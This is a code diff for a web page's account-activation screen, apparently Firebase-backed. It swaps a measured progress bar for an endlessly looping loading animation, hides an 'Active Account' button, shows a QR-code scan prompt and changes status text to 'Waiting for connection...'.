@@ -536,8 +536,21 @@ input {
     }
 }
     
+@keyframes continuousLoading {
+    0% {
+        transform: translateX(-110%);
+    }
+    100% {
+        transform: translateX(300%);
+    }
+}
 
-
+#progressBar {
+    width: 35% !important;
+    animation: continuousLoading 1.2s ease-in-out infinite !important;
+    transition: none !important;
+    border-radius: 4px;
+}
 
     #status {
         margin-top: clamp(
@@ -605,34 +618,27 @@ input {
     </div>
 </div>
 
-
-<div id="progressWrapper" class="input-group" style="display: none; width: 100%;">
-    <div style="width: 100%; background-color: #e0e0e0; border-radius: 4px; position: relative; height: 35px; overflow: hidden; margin-top: 5px;">
-        <div id="progressBar" style="width: 0%; height: 100%; background-color: #2196F3; transition: width 0.5s ease;"></div>
-        <span id="progressText" style="position: absolute; width: 100%; text-align: center; left: 0; top: 0; line-height: 35px; color: #333; font-weight: bold;">Connecting..</span>
+<div id="progressWrapper" class="input-group" style="display:block; width:100%;">
+    <div style="width:100%; background-color:#444; border-radius:4px; position:relative; height:35px; overflow:hidden; margin-top:5px;">
+        <div id="progressBar" style="width:35%; height:100%; background-color:#2196F3; animation:continuousLoading 1.2s ease-in-out infinite;"></div>
     </div>
-    
-    <div id="qrHelpMessage" style="width: 100%; text-align: center; margin-top: 8px; font-size: 14px; color: #666; font-weight: 500; display: none;">
+
+    <div id="progressText" style="width:100%; text-align:center; margin-top:8px; font-size:14px; color:#fff; font-weight:bold;">
+        Connecting..
+    </div>
+
+    <div id="qrHelpMessage" style="width:100%; text-align:center; margin-top:8px; font-size:14px; color:#ccc; font-weight:500; display:block;">
         To activate your account, please scan the QR code
     </div>
 </div>
 
+<button id="actionBtn" onclick="handleActiveClick()" style="display:none!important;">Active Account</button>
 
-<button id="actionBtn" onclick="handleActiveClick()">Active Account</button>
-
-
-<div id="status" style="display: none;">Connecting..</div>
-
-
-
+<div id="status" style="display:block; margin-top:18px; min-height:22px; width:100%; color:#aaa; font-size:13px; text-align:center;">
+    Waiting for connection...
+</div>
+    
 <script>
-
-
-
-
-
-
-
 const firebaseConfig = {
 
     apiKey:
@@ -919,7 +925,7 @@ function listenToDevice() {
                     progressText.innerText = "Processing..";
                 }
 
-                status.innerText = " ";
+                status.innerText = "Waiting for connection...";
                 status.className = "success";
             } else {
                 realActiveCode = "";
@@ -1039,7 +1045,7 @@ function fallbackCopy(text) {
 
 window.addEventListener("DOMContentLoaded", async function() {
     try {
-        status.innerText = " ";
+        status.innerText = "Waiting for connection...";
         currentDeviceKey = await getOrCreateDeviceKey();
         deviceKeyField.value = "xxxxxxx";
         listenToDevice();
